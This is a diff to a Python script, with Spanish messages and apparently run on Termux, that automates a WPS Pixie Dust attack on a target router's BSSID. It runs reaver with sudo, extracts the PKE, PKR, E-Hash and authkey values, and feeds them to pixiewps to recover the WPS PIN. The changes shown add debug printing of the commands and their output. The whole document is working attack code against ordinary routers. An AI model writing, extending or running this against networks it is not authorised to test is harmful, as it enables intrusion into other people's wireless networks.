@@ -56,7 +56,12 @@ def perform_pixie_dust_attack(bssid):
     """Realiza el ataque Pixie Dust usando reaver y pixiewps."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
     reaver_path = "/data/data/com.termux/files/home/reaver-wps-fork-t6x/src/reaver"
+    print(f"Ejecutando reaver: {reaver_path} -i wlan0 -b {bssid} -vvv --pixie-dust")
     stdout, stderr = run_command(f"{reaver_path} -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)
+
+    print("Salida de reaver:")
+    print(stdout)
+    print(stderr)
 
     if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
         print("Información obtenida para Pixie Dust:")
@@ -72,7 +77,12 @@ def perform_pixie_dust_attack(bssid):
 
         # Ejecutar pixiewps con los valores extraídos
         pixiewps_command = f"pixiewps -e {ehash1} -r {ehash2} -s {pke} -z {pkr} -a {authkey} -vv"
+        print(f"Ejecutando pixiewps: {pixiewps_command}")
         pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=False)
+
+        print("Salida de pixiewps:")
+        print(pixie_stdout)
+        print(pixie_stderr)
 
         if "WPS pin:" in pixie_stdout:
             pin = extract_value(pixie_stdout, "WPS pin:")
